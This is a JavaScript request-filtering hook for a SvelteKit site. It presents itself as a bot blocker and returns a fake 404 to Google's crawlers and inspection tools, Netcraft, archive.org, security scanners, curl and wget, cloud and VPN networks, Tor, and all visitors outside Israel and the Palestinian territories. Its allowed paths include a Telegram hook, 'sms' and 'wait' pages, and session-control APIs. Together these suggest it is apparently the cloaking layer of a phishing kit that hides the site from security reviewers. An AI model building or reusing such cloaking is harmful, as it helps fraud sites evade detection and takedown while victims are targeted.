/**
 * Hardened bot / crawler / scanner / cloud blocker.
 *
 * Layers of defense (each short-circuits to a 404):
 *   0. Allow-list admin + API + static assets
 *   1. Geo: only IL + PS
 *   2. Cloudflare signals: block known hosting / bot ASNs, Tor, known orgs
 *   3. User-Agent patterns + structural checks
 *   4. Missing / fake browser headers
 *   5. Datacenter / VPN IP fallback via ipapi.co
 */

import { inc } from '$lib/stats.js';
import { isAdminAuthed } from '$lib/auth.js';

// ---------- UA patterns ----------
const BOT_UA = /(googlebot|adsbot-google|mediapartners-google|google-inspectiontool|google-site-verification|google-read-aloud|googleother|googleweblight|apis-google|feedfetcher-google|google favicon|chrome-lighthouse|google page speed|googleimageproxy|bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|python\/|go-http|okhttp|httpclient|java\/|axios|node-fetch|got\/|undici|lighthouse|headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|pagespeed|gtmetrix|pingdom|uptimerobot|monitoring|statuscake|newrelic|datadog|site24x7|seobility|semrush|ahrefs|majestic|mj12|dotbot|petalbot|yandex|bingpreview|applebot|facebot|facebookexternalhit|whatsapp|telegrambot|discordbot|skypeuri|linkedinbot|twitterbot|slackbot|embedly|vkshare|w3c_validator|feedburner|rss|newsgator|postman|insomnia|apachebench|ab\/|siege|hey\/|vegeta|k6|locust|gatling|masscan|zgrab|nuclei|nikto|nmap|sqlmap|acunetix|nessus|openvas|burpsuite|zaproxy|wpscan|gobuster|dirbuster|ffuf|feroxbuster|shodan|censys|binaryedge|netcraft|archive\.org|wayback|httrack|heritrix|scrapy|colly|winhttp|libwww|lwp|mechanize|requests)/i;

// ---------- Hosting / cloud / VPN / datacenter org names ----------
const BAD_ORG = /(amazon|aws\b|google[- ]?cloud|\bgcp\b|microsoft|azure|digitalocean|linode|vultr|hetzner|\bovh\b|scaleway|oracle|alibaba|tencent|baidu|contabo|choopa|leaseweb|m247|cloudflare|fastly|akamai|rackspace|\bibm\b|upcloud|datacamp|kamatera|cdn77|stackpath|bunny|cherryservers|ramnode|buyvm|pfcloud|worldstream|psychz|cogent|he\.net|quadranet|servermania|hivelocity|colocrossing|gcorelabs|g-core|cloudvps|vpsserver|ionos|hostwinds|privateinternetaccess|\bpia\b|nordvpn|expressvpn|protonvpn|surfshark|mullvad|cyberghost|ipvanish|hidemyass|windscribe|privadovpn|airvpn|purevpn|\btor\b|tor[- ]?exit|tor[- ]?relay|relay|proxy|anonymous|hosting|colocation|server|\bvps\b|dedicated|datacenter|data[- ]?center|cdn|bot|crawler)/i;

// ---------- Known bad ASNs (hosting / VPN / scanners) ----------
const BAD_ASNS = new Set([
  16509, 14618, 8987, 39111,                        // AWS
  15169, 36040, 396982, 19527, 22577, 41264, 139190, 394089, 394699, // Google / Googlebot / GCP
  8075, 8068, 8069, 8070, 8071, 8072, 8073, 8074,   // Microsoft / Azure
  14061,                                            // DigitalOcean
  63949,                                            // Linode
  20473,                                            // Vultr / Choopa
  16276,                                            // OVH
  24940,                                            // Hetzner
  12876,                                            // Scaleway / Online.net
  31898, 7160,                                      // Oracle Cloud
  45102, 37963,                                     // Alibaba
  132203, 45090,                                    // Tencent
  9009,                                             // M247 / LeaseWeb / others
  60781, 16265, 30633, 7203,                        // Leaseweb
  13335,                                            // Cloudflare
  54113,                                            // Fastly
  174,                                              // Cogent
  6939,                                             // Hurricane Electric
  36351,                                            // IBM / SoftLayer
  51167,                                            // Contabo
  26496, 21501,                                     // GoDaddy
  199524,                                           // G-Core
  133380,                                           // PIA / London Trust Media
  136787, 200019,                                   // NordVPN / Tefincom
  62371, 62240,                                     // ProtonVPN
  56971,                                            // ExpressVPN
  39351,                                            // Mullvad
  8100,                                             // Quadranet
  36352,                                            // ColoCrossing
  203020, 208091,                                   // HostRoyale etc
  396356                                            // Path.net
]);

// ---------- Always-allow paths ----------
const ALLOW_PATHS = [
  /^\/admin(\/|$)/,
  /^\/login(\/|$)/,
  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session|admin-login|presence)(\/|$)?/,
  /^\/wait(\.html)?(\/|$)/,
  /^\/sms(\.html)?(\/|$)/,
  /^\/img\//,
  /^\/css\//,
  /^\/js\//,
  /^\/favicon/
];

// Admin-protected paths (need valid admin_token cookie)
const ADMIN_PATHS = [
  /^\/admin(\/|$)/,
  /^\/api\/(sessions|set-mode|delete-session)(\/|$)?/
];

// ---------- ipapi.co fallback cache ----------
const ipCache = new Map();
const IP_TTL = 60 * 60 * 1000;

async function isBadIP(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) return false;
  const cached = ipCache.get(ip);
  if (cached && cached.exp > Date.now()) return cached.bad;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
    if (!r.ok) return false;
    const j = await r.json();
    const org = `${j.org || ''} ${j.asn || ''} ${j.network || ''}`;
    const bad = BAD_ORG.test(org);
    ipCache.set(ip, { bad, exp: Date.now() + IP_TTL });
    return bad;
  } catch {
    return false;
  }
}

function blockResponse() {
  return new Response('', {
    status: 404,
    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
  });
}

function block(platform) {
  inc(platform, 'botsBlocked').catch(() => {});
  return blockResponse();
}

/** @type {import('@sveltejs/kit').Handle} */
export async function handle({ event, resolve }) {
  const { request, url, getClientAddress, platform, cookies } = event;
  const path = url.pathname;

  // Admin guard runs FIRST (before bot blocker) so legitimate admin always reaches login
  if (ADMIN_PATHS.some((re) => re.test(path))) {
    const token = cookies.get('admin_token');
    const authed = await isAdminAuthed(platform, token);
    if (!authed) {
      // For HTML page requests, redirect to login. For API, return 401.
      const accept = request.headers.get('accept') || '';
      if (accept.includes('text/html')) {
        return new Response('', { status: 302, headers: { Location: '/login' } });
      }
      return new Response('unauthorized', { status: 401 });
    }
    return resolve(event);
  }

  // 0. Always-allowed paths (login page, public APIs, static assets)
  if (ALLOW_PATHS.some((re) => re.test(path))) return resolve(event);

  const cf = platform?.cf || {};
  const h = request.headers;

  // 1. Geo — only IL + PS
  const country = h.get('cf-ipcountry') || cf.country || '';
  if (country && country !== 'IL' && country !== 'PS') {
    return block(platform);
  }
  // Cloudflare tags Tor exits as T1
  if (country === 'T1') return block(platform);

  // 2. Cloudflare ASN / org check (fast — no external lookup)
  const asn = Number(cf.asn || 0);
  if (asn && BAD_ASNS.has(asn)) return block(platform);
  const asOrg = String(cf.asOrganization || '');
  if (asOrg && BAD_ORG.test(asOrg)) return block(platform);

  // 3. User-Agent checks
  const ua = h.get('user-agent') || '';
  if (!ua.trim()) return block(platform);
  if (BOT_UA.test(ua)) return block(platform);
  if (ua.length < 40) return block(platform);              // too short = not real browser
  if (!/Mozilla\/5\.0/i.test(ua)) return block(platform);  // all real browsers use this

  // 4. Real-browser headers
  if (!h.get('accept-language')) return block(platform);
  const accept = h.get('accept') || '';
  if (!accept) return block(platform);

  // 5. ipapi.co fallback for top-level HTML page loads
  const isHtml = accept.includes('text/html');
  if (isHtml) {
    const ip = getClientAddress();
    if (await isBadIP(ip)) return block(platform);
  }

  return resolve(event);
}
